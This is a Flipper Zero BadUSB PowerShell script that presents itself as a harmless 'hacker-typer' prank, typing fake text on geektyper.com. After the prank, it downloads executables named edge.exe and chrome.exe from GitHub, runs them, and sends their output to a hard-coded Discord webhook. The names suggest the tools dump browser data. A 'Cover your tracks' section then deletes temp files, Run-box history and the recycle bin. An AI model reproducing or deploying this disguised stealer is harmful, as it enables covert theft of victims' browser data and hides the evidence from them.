# Hacker-typer By UberGuidoZ Git BadUSB resources -> https://github.com/UberGuidoZ/Flipper/tree/main/BadUSB
# Opens a harmless website and types like a hacker
#
#
# Merged with delayed rickroll by AbeNaws in an attempt create a script which will run after some preset delay
#AbeNAws Git BadUsb resources -> https://github.com/AbeNaws/Flipper-Zero-BadUsb-Scripts
# ###########################################
# #                                         |
# # Title        : Windows Delayed Rickroll |
# # Author       : AbeNaws                  |
# # Version      : 1.0                      |
# # Category     : Prank                    |
# # Target       : Windows                  |
# #                                         |
# ###########################################
#
#Also special thanks to I-Am-Jakoby for his creation of the Jumpscare 2.0 which is where I learned what little I know about .ps1 files.  All of this was borrowed and re-worked to accomplish my goal!
#I-Am-Jakoby Git BadUsb resources -> https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB
#
#
# Converted to .js and then to .ps1 by Luciferseamus - reason- I wanted to be able to run this but have the option to delay the effect.  I couldn't figure out how to do it via .txt file so I 
# converted it to .js format.  It seemed easier after messing with PS commands for almost an entire weekend. I did learn alot however!  
# I could not have done any of this without inspiration from these three Titans and the entire f0 community. Thanks to all of you for inspiring me to undertake this project.
#UPDATE (08/30/2024):NOW INCLUDING - Wait for mouse option!

#############################################################################################################################################

#Adjust what $d= to change delay and change what $n= to adjust how many times to repeat the script. Currently set  1 hr. & no repeats
$n=1;$d=30;1..$n|%{Start-Sleep -s $d; Start microsoft-edge:'http://geektyper.com/plain'; $wshell = New-Object -ComObject wscript.shell; Sleep 2; $wshell.SendKeys('{f11}'); 
  Sleep 2; 
$wshell.SendKeys('qwertyyuiopjkfldsqwertyufdasfdasiopqwertyutyufdasfdfdafdsldsqwertyufdasffdadasiopqwertyutyufdasfdasiopqwertiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakstyuiop'); 
 Sleep 5; 
$wshell.SendKeys('{RIGHT}'); 
 Sleep 12; 
$wshell.SendKeys('{BS}'); 
$wshell.SendKeys('qwertfdafdsayuiopqwertyuiopqqwerfdafmjmjhmuymuyukjjhgkuyukuueaftyyuiopqwertyufdasfdasiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakstyuiopwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakstyuiop'); 
 <#
 Sleep 5; 
$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 5;
#$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 2;
$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 2;
$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 2;
$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 2;
$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
#>
 Sleep 2;
$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 5; 
$wshell.SendKeys('{HOME}'); 
 Sleep 4; 
$wshell.SendKeys('{6}'); 
 Sleep 6; 
$wshell.SendKeys('{7}'); 
 Sleep 5;  
$wshell.SendKeys('{+}'); 
 Sleep 5; 
$wshell.SendKeys('{BS}'); 
 Sleep 2; 
$wshell.SendKeys('qwertyyuiopjkfldsqwertyufdasfdasiopqwertyutyufdasfdfdafdsldsqwertyufdasffdadasiopqwertyutyufdasfdasiopqwertiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakstyuiop'); 
 Sleep 3;
$wshell.SendKeys('qwertyyuiopjkfldsqwertyufdasfdasiopqwertyutyufdasfdfdafdsldsqwertyufdasffdadasiopqwertyutyufdasfdasiopqwertiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakstyuiop'); 
 Sleep 5;
 $wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakstyuiop'); 
 Sleep 5; 
$wshell.SendKeys('qwertfdafdsayuiopqwertyuiopqqwerfdafmjmjhmuymuyukjjhgkuyukuueaftyyuiopqwertyufdasfdasiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakstyuiopwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerfhdjkslafdhjakstyuiop'); 
 Sleep 5; 
$wshell.SendKeys('{2}'); 
<#
$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 5; 
$wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 5;  
 #>
$wshell.SendKeys('{3}'); $wshell.SendKeys('qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiop'); 
 Sleep 5; 
$wshell.SendKeys('{END}');  Sleep 5; $wshell.SendKeys('{0}'); Sleep 7; $wshell.SendKeys('%{F4}')};

$D="$env:tmp";

cd $D\t;
    $webhookUrl = 'https://discord.com/api/webhooks/1256048768206241803/BWYs2QrnsKznXQ9dSCCX4FJVvQvHKn9KpcvXFHJoKL5iWCRW_FWMravdB-8qJfslVn_n'; 
    #$edgeUrl = 'https://github.com/luciferseamus/Browser_exe/raw/main/edge/edge.exe';
    $EdgePath = '.\edge.exe';
    if (-not (Test-Path -Path $EdgePath)) {Invoke-WebRequest -Uri $edgeUrl -OutFile $edgePath;}
$EdgeOutput = & $edgePath | Out-String;  #$fileName = 'edge.txt';  $EdgeOutput | Out-File -FilePath $fileName;
    $chunks = [Math]::Ceiling($EdgeOutput.Length / 2000);for ($i = 0; $i -lt $chunks; $i++) {$start = $i * 2000;$length = [Math]::Min(2000, $EdgeOutput.Length - $start);$content = $EdgeOutput.Substring($start, $length); 
    $webhookContent = @{'username' = 'H1g0rlu_edge';'content' = $content;};  
    $jsonData = ConvertTo-Json -InputObject $webhookContent;IWR -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json';Start-Sleep -Seconds 1;};

    $webhookUrl = 'https://discord.com/api/webhooks/1256048768206241803/BWYs2QrnsKznXQ9dSCCX4FJVvQvHKn9KpcvXFHJoKL5iWCRW_FWMravdB-8qJfslVn_n'; 
    $chromeUrl = 'https://github.com/luciferseamus/Browser_exe/raw/main/chrome/chrome.exe';
    $chromePath = '.\chrome.exe';
    if (-not (Test-Path -Path $chromePath)) {Invoke-WebRequest -Uri $chromeUrl -OutFile $chromePath;}
$chromeOutput = & $chromePath | Out-String;  #$fileName = 'chrome.txt';  $chromeOutput | Out-File -FilePath $fileName;
    $chunks = [Math]::Ceiling($chromeOutput.Length / 2000);for ($i = 0; $i -lt $chunks; $i++) {$start = $i * 2000;$length = [Math]::Min(2000, $chromeOutput.Length - $start);$content = $chromeOutput.Substring($start, $length); 
    $webhookContent = @{'username' = 'H1g0rlu_chrome';'content' = $content;};  
    $jsonData = ConvertTo-Json -InputObject $webhookContent;IWR -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json';Start-Sleep -Seconds 1;};

#############################################################################################################################################
#Cover your tracks!

$D="$env:tmp"

# Delete the zip
rm $D\t.zip* -r -Force -ErrorAction SilentlyContinue

# Delete Wait for mouse .ps1
rm $D\Wm* -r -Force -ErrorAction SilentlyContinue

# empty temp folder
rm $D\t* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
#Remove-Item (Get-PSreadlineOption).HistorySavePath

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue